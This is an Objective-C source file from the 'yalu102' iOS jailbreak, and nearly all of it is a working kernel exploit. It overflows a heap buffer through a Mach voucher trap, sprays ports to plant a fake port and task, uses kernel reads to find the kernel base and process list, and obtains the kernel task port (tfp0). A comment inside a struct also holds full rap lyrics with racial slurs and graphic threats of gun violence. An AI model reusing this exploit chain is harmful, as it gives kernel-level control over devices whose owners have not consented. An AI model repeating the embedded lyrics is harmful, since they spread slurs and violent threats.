//
//  ViewController.m
//  yalu102
//
//  Created by qwertyoruiop on 05/01/2017.
//  Copyright © 2017 kimjongcracks. All rights reserved.
//

#import "offsets.h"
#import "ViewController.h"
#import <mach-o/loader.h>
#import <sys/mman.h>
#import <pthread.h>
#undef __IPHONE_OS_VERSION_MIN_REQUIRED
#import <mach/mach.h>
#include <sys/utsname.h>

extern uint64_t procoff;

typedef struct {
    mach_msg_header_t head;
    mach_msg_body_t msgh_body;
    mach_msg_ool_ports_descriptor_t desc[256];
    char pad[4096];
} sprz;

@interface ViewController ()

@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    init_offsets();
    struct utsname u = { 0 };
    uname(&u);
    

    if (strstr(u.version, "MarijuanARM")) {
        [dope setEnabled:NO];
        [dope setTitle:@"already jailbroken" forState:UIControlStateDisabled];
    }

    // Do any additional setup after loading the view, typically from a nib.
}

typedef natural_t not_natural_t;

struct not_essers_ipc_object {
    not_natural_t io_bits;
    not_natural_t io_references;
    char    io_lock_data[1337];
    /*
     
     https://www.youtube.com/watch?v=ZADJ8S1qH3U
     
     
     [Intro]
     Lets get it
     Steve Drive
     R.I.P L'A Capone
     OTF
     These nigga's steady woofing like they want beef, want beef?
     You want smoke? You want smoke? Just tell me
     
     [Hook]
     These niggas steady woofing like they want beef, want beef?[You want smoke?]
     I can make that happen if you want beef, you want beef?[You want smoke?]
     Catch you while you're capping with this semi, semi
     Put the semi-automatic to your kidney, kidney
     
     [Verse 1]
     Put the semi-automatic to your kidney, kidney
     I'm off the dope I got the pole you talking tough you getting smoked
     These nigga's steady woofing like they want beef, but I really know
     Glock or nickel yeah that bitch go, I'm going like I'm at a fucking show
     I'm off Tu pack saying fuck Jojo[Fuck Jojo]
     Talking shit get your life took no joke
     I'm with my nigga's and my niggas ain't no joke
     And if you got that fucking bag then you getting poked
     And if you acting tough, I'ma fucking blow, and that's on Pluto[On Pluto]
     Me and Durk finna spaz, and I put that on the guys, it's homicides
     Cause we dropping Y's[Die Y, Die Y], head shot got him traumatized
     And you want beef?[You want beef fu nigga?] but when I see you, you don't speak?[You don't even talk]
     I got my 9 on me[Rondo] and I'ma blow and that's on me[I'm Rondo]
     I'm getting tree tree[Getting dope], getting top from a bitch named Kiki
     
     [Chorus]
     
     [Verse 2]
     And if you really want smoke[You want smoke little nigga?]
     I will give your ass smoke[Give your ass smoke little nigga?]
     This Glock 9 bitch I tote, and I will put it to your throat
     I'm off this Tooka pack and no L'A, I'ma go crazy
     You supposed to be my nigga but actin' like a fan that’s crazy
     What the fuck wrong with these nigga's, they fugazi
     I made this song for the niggas, cause they crazy
     Separate me from them niggas[Separate Rondo]
     Pull up on your block, with the mops
     Then I hit the dip and put him up in case of attempts[Incase a nigga survive]
     But we don't make throws, we shoot like Pimp[We shoot to kill]
     I got 23[Two three] So i don't fucking speak[I don't speak]
     Riding fast, I hit the dash, ain't gon last[You ain't gonna last nigga], I'ma blast[Cause ima blast on a nigga]
     Numba Nine, bitch [I'm #9 lil nigga], and I'm a sav, bitch
     
     [Chorus]
     */

};



#define IO_BITS_ACTIVE 0x80000000
#define	IKOT_TASK 2
#define IKOT_IOKIT_CONNECT 29
#define IKOT_CLOCK 25

char dt[128];
- (IBAction)yolo:(UIButton*)sender
{
    /*
     
     we out here!
     
     */
    
    mach_port_t vch = 0;
    
    mach_voucher_attr_recipe_data_t *data = malloc(sizeof(mach_voucher_attr_recipe_data_t) + 0x10);
    data->content_size = 0;
    data->key=MACH_VOUCHER_ATTR_KEY_BANK;
    data->command=610;
    data->previous_voucher=MACH_PORT_NULL;
    
    kern_return_t lol = host_create_mach_voucher(mach_host_self(), data, sizeof(mach_voucher_attr_recipe_data_t), &vch);
    
    assert(lol==0 && vch!=0);
    
    
    unsigned char* odata = mmap(0, 0x8000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
    unsigned char* fdata = mmap(odata+0x4000, 0x4000, PROT_NONE, MAP_PRIVATE|MAP_ANON|MAP_FIXED, -1, 0);
    assert(fdata == odata + 0x4000);
    memset(odata, 0x42, 0x0);
    
    
    uint64_t rsz = 0x100; // alloc size;
    fdata -= rsz + 0x100; // overflow full chunk
    
    struct not_essers_ipc_object* fakeport = mmap(0, 0x8000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
    
    mlock(fakeport, 0x8000);
    
    fakeport->io_bits = IO_BITS_ACTIVE | IKOT_CLOCK;
    fakeport->io_lock_data[12] = 0x11;
    
    *(uint64_t*) (fdata + rsz) = (uint64_t) fakeport;
    
    
    mach_port_t* ports = calloc(800, sizeof(mach_port_t));
    
    for (int i = 0; i < 800; i++) {
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &ports[i]);
        mach_port_insert_right(mach_task_self(), ports[i], ports[i], MACH_MSG_TYPE_MAKE_SEND);
    }
    sprz msg1;
    
    memset(&msg1, 0, sizeof(sprz));
    sprz msg2;
    
    memset(&msg2, 0, sizeof(sprz));
    msg1.msgh_body.msgh_descriptor_count = 128;
    
    msg1.head.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
    msg1.head.msgh_local_port = MACH_PORT_NULL;
    msg1.head.msgh_size = sizeof(msg1)-2048;
    
    mach_port_t* buffer = calloc(0x1000, sizeof(mach_port_t));
    for (int i = 0; i < 0x1000; i++) {
        buffer[i] = MACH_PORT_DEAD;
    }
    
    for (int i = 0; i < 256; i++) {
        msg1.desc[i].address = buffer;
        msg1.desc[i].count = 0x100/8;
        msg1.desc[i].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
        msg1.desc[i].disposition = 19;
    }
    
    pthread_yield_np();
    for (int i=1; i<300; i++) {
        msg1.head.msgh_remote_port = ports[i];
        kern_return_t kret = mach_msg(&msg1.head, MACH_SEND_MSG, msg1.head.msgh_size, 0, 0, 0, 0);
        assert(kret==0);
    }
    
    pthread_yield_np();
    for (int i=500; i<800; i++) {
        msg1.head.msgh_remote_port = ports[i];
        kern_return_t kret = mach_msg(&msg1.head, MACH_SEND_MSG, msg1.head.msgh_size, 0, 0, 0, 0);
        assert(kret==0);
    }
    
    pthread_yield_np();
    for (int i=300; i<500; i++) {
        msg1.head.msgh_remote_port = ports[i];
        if (i%4 == 0) {
            msg1.msgh_body.msgh_descriptor_count = 1;
        } else {
            msg1.msgh_body.msgh_descriptor_count = 256;
        }
        kern_return_t kret = mach_msg(&msg1.head, MACH_SEND_MSG, msg1.head.msgh_size, 0, 0, 0, 0);
        assert(kret==0);
    }
    
    pthread_yield_np();
    for (int i = 300; i<500; i+=4) {
        msg2.head.msgh_local_port = ports[i];
        kern_return_t kret = mach_msg(&msg2.head, MACH_RCV_MSG, 0, sizeof(msg1), ports[i], 0, 0);
        if(!(i < 380))
            ports[i] = 0;
        assert(kret==0);
    }
    for (int i = 300; i<380; i+=4) {
        msg1.head.msgh_remote_port = ports[i];
        msg1.msgh_body.msgh_descriptor_count = 1;
        kern_return_t kret = mach_msg(&msg1.head, MACH_SEND_MSG, msg1.head.msgh_size, 0, 0, 0, 0);
        assert(kret==0);
    }
    
    mach_voucher_extract_attr_recipe_trap(vch, MACH_VOUCHER_ATTR_KEY_BANK, fdata, &rsz);
    mach_port_t foundport = 0;
    for (int i=1; i<500; i++) {
        if (ports[i]) {
            msg1.head.msgh_local_port = ports[i];
            pthread_yield_np();
            kern_return_t kret = mach_msg(&msg1, MACH_RCV_MSG, 0, sizeof(msg1), ports[i], 0, 0);
            assert(kret==0);
            for (int k = 0; k < msg1.msgh_body.msgh_descriptor_count; k++) {
                mach_port_t* ptz = msg1.desc[k].address;
                for (int z = 0; z < 0x100/8; z++) {
                    if (ptz[z] != MACH_PORT_DEAD) {
                        if (ptz[z]) {
                            foundport = ptz[z];
                            goto foundp;
                        }
                        
                    }
                }
            }
            mach_msg_destroy(&msg1.head);
            mach_port_deallocate(mach_task_self(), ports[i]);
            ports[i] = 0;
        }
    }
    [sender setTitle:@"failed, retry" forState:UIControlStateNormal];
    return;
    
foundp:
    NSLog(@"found corruption %x", foundport);
    
    uint64_t textbase = 0xfffffff007004000;
    
    for (int i = 0; i < 0x300; i++) {
        for (int k = 0; k < 0x40000; k+=8) {
            *(uint64_t*)(((uint64_t)fakeport) + 0x68) = textbase + i*0x100000 + 0x500000 + k;
            *(uint64_t*)(((uint64_t)fakeport) + 0xa0) = 0xff;
            
            kern_return_t kret = clock_sleep_trap(foundport, 0, 0, 0, 0);
            
            if (kret != KERN_FAILURE) {
                goto gotclock;
            }
        }
    }
    [sender setTitle:@"failed, retry" forState:UIControlStateNormal];
    return;
    
gotclock:;
    uint64_t leaked_ptr =  *(uint64_t*)(((uint64_t)fakeport) + 0x68);
    
    leaked_ptr &= ~0x3FFF;
    
    fakeport->io_bits = IKOT_TASK|IO_BITS_ACTIVE;
    fakeport->io_references = 0xff;
    char* faketask = ((char*)fakeport) + 0x1000;
    
    *(uint64_t*)(((uint64_t)fakeport) + 0x68) = faketask;
    *(uint64_t*)(((uint64_t)fakeport) + 0xa0) = 0xff;
    *(uint64_t*) (faketask + 0x10) = 0xee;
    
    while (1) {
        int32_t leaked = 0;
        *(uint64_t*) (faketask + procoff) = leaked_ptr - 0x10;
        pid_for_task(foundport, &leaked);
        if (leaked == MH_MAGIC_64) {
            NSLog(@"found kernel text at %llx", leaked_ptr);
            break;
        }
        leaked_ptr -= 0x4000;
    }
    
    uint64_t kernel_base = leaked_ptr;
    
    uint64_t allproc = allproc_offset + kernel_base;
    
    uint64_t proc_ = allproc;
    
    uint64_t myproc = 0;
    uint64_t kernproc = 0;
    
    while (proc_) {
        uint64_t proc = 0;
        
        *(uint64_t*) (faketask + procoff) = proc_ - 0x10;
        pid_for_task(foundport, (int32_t*)&proc);
        *(uint64_t*) (faketask + procoff) = 4 + proc_ - 0x10;
        pid_for_task(foundport, (int32_t*)(((uint64_t)(&proc)) + 4));
        
        int pd = 0;
        *(uint64_t*) (faketask + procoff) = proc;
        pid_for_task(foundport, &pd);
        
        if (pd == getpid()) {
            myproc = proc;
        } else if (pd == 0){
            kernproc = proc;
        }
        proc_ = proc;
    }
    
    
    uint64_t kern_task = 0;
    *(uint64_t*) (faketask + procoff) = kernproc - 0x10 + 0x18;
    pid_for_task(foundport, (int32_t*)&kern_task);
    *(uint64_t*) (faketask + procoff) = 4 + kernproc - 0x10 + 0x18;
    pid_for_task(foundport, (int32_t*)(((uint64_t)(&kern_task)) + 4));
    
    uint64_t itk_kern_sself = 0;
    *(uint64_t*) (faketask + procoff) = kern_task - 0x10 + 0xe8;
    pid_for_task(foundport, (int32_t*)&itk_kern_sself);
    *(uint64_t*) (faketask + procoff) = 4 + kern_task - 0x10 + 0xe8;
    pid_for_task(foundport, (int32_t*)(((uint64_t)(&itk_kern_sself)) + 4));
    
    char* faketaskport = malloc(0x1000);
    char* ktaskdump = malloc(0x1000);
    
    for (int i = 0; i < 0x1000/4; i++) {
        *(uint64_t*) (faketask + procoff) = itk_kern_sself - 0x10 + i*4;
        pid_for_task(foundport, (int32_t*)(&faketaskport[i*4]));
    }
    for (int i = 0; i < 0x1000/4; i++) {
        *(uint64_t*) (faketask + procoff) = kern_task - 0x10 + i*4;
        pid_for_task(foundport, (int32_t*)(&ktaskdump[i*4]));
    }
    
    memcpy(fakeport, faketaskport, 0x1000);
    memcpy(faketask, ktaskdump, 0x1000);
    
    mach_port_t pt = 0;
    
    *(uint64_t*)(((uint64_t)fakeport) + 0x68) = faketask;
    *(uint64_t*)(((uint64_t)fakeport) + 0xa0) = 0xff;
    
    *(uint64_t*)(((uint64_t)faketask) + 0x2b8) = itk_kern_sself;
    
    task_get_special_port(foundport, 4, &pt); // get tfp0
    NSLog(@"got tfp0 -> %x", pt);
    fakeport->io_bits = 0;
    
    extern uint64_t slide;
    slide = kernel_base - 0xFFFFFFF007004000;
    
    void exploit(void*, mach_port_t, uint64_t, uint64_t);
    exploit(sender, pt, kernel_base, allproc_offset);
    [dope setEnabled:NO];
    [dope setTitle:@"already jailbroken" forState:UIControlStateDisabled];

}

- (void)didReceiveMemoryWarning {
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}


@end
